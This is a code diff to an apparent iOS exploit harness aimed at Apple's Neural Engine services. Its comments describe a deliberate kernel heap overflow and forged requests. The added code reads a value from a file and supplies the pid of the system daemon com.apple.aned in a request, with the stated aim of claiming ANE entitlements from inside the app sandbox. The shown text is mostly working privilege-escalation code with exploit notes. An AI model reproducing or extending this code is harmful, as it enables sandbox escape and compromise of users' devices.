@@ -988,6 +988,15 @@ static void p044_stage_surfaces(uint32_t *sidsOut, uint32_t maxOut,
    as the table count. Do not remaining-fire 254. */
 static uint32_t p044ReqInOverride;
 static uint32_t p044_req_in(void) { return p044ReqInOverride ? p044ReqInOverride : P044_REQ_IN; }
+/* v75 Stage-B probe (note 226): Documents/p044_proc_idx.txt = decimal value for
+   the request's procedureIndex argument. The Ghidra decode of the ANE
+   program-setup path (FUN_8739b14) performs the entitlement checks
+   (com.apple.ane.memoryUnwiring*/increased-model-size-limit) against a task
+   found BY A REQUEST-SUPPLIED PID — if the ride-through reaches that pid
+   field, setting this to com.apple.aned's pid (found via kern.proc) claims
+   the ane.* gates from the app sandbox. procIdx=0 = stock. Consumed on read. */
+static uint32_t p044ProcIdxOverride;
+static uint32_t p044_proc_idx(void) { return p044ProcIdxOverride ? p044ProcIdxOverride : 0; }
 /* v56: 602112 -> 0x4000. Note 127 proved CheckandPrewire marshals into a FIXED
    kalloc.3072 object (192-record capacity) regardless of request count — the
    overflow is the mechanism, not the geometry. The remaining variable is why
@@ -1319,7 +1328,7 @@ static int p044_ane_build_request(NSMutableString *out) {
     }
     g_aneReq = ((id (*)(id, SEL, id, id, id, id, id))objc_msgSend)(reqCls,
         NSSelectorFromString(@"requestWithInputs:inputIndices:outputs:outputIndices:procedureIndex:"),
-        inputs, inIdx, outputs, outIdx, @0);
+        inputs, inIdx, outputs, outIdx, @(p044_proc_idx()));
     if (!g_aneReq) {
         [out appendString:@"  _ANERequest create failed\n"];
         return 0;
@@ -1329,8 +1338,8 @@ static int p044_ane_build_request(NSMutableString *out) {
     if ([g_aneReq respondsToSelector:vSel]) {
         valid = ((BOOL (*)(id, SEL))objc_msgSend)(g_aneReq, vSel);
     }
-    [out appendFormat:@"  request: inputs=%u outputs=1 procIdx=0 sids=%u..%u validate=%d (forge set=%u)\n",
-        (unsigned)p044_req_in(), firstSid, lastSid, valid, g_forgeCount];
+    [out appendFormat:@"  request: inputs=%u outputs=1 procIdx=%u sids=%u..%u validate=%d (forge set=%u)\n",
+        (unsigned)p044_req_in(), (unsigned)p044_proc_idx(), firstSid, lastSid, valid, g_forgeCount];
     return 1;
 }
 
@@ -2288,6 +2297,32 @@ static void *watch_worker(void *arg) {
         } else {
             [out appendFormat:@"  [v73] REQ_IN default=%u (1-record OOB). Documents/p044_req_in.txt ABSENT — HouseArrest not required. Write 191 for in-bounds.\n",
              P044_REQ_IN];
+        }
+    }
+    /* v75 Stage-B procIdx override: same consumed-file protocol as req_in.
+       Write DECIMAL procedureIndex into app Documents/p044_proc_idx.txt.
+       Note 226: the ANE program-setup path runs the ane.* entitlement checks
+       against a task found by a request-supplied pid — setting the override
+       to com.apple.aned's pid (kern.proc) tests whether the procIdx field
+       reaches that pid (log the kernel syslog for [ERROR]/entitlement lines). */
+    {
+        NSString *sweepDocs = NSSearchPathForDirectoriesInDomains(
+            NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+        NSString *sweepPath = [sweepDocs stringByAppendingPathComponent:@"p044_proc_idx.txt"];
+        NSString *s = [NSString stringWithContentsOfFile:sweepPath
+                                                encoding:NSUTF8StringEncoding error:NULL];
+        if (s) {
+            NSCharacterSet *nonDigits = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
+            NSString *digits = [[s componentsSeparatedByCharactersInSet:nonDigits]
+                                  componentsJoinedByString:@""];
+            uint32_t n = (uint32_t)digits.integerValue;
+            if (n > 0 && n <= 100000) {
+                p044ProcIdxOverride = n;
+                [out appendFormat:@"  [v75] PROC_IDX OVERRIDE=%u Stage-B probe ARMED (aned pid? from p044_proc_idx.txt; consumed)\n", n];
+            } else {
+                [out appendFormat:@"  [v75] p044_proc_idx.txt present but N=%u out of range — procIdx 0 kept\n", n];
+            }
+            unlink(sweepPath.fileSystemRepresentation);
         }
     }
 
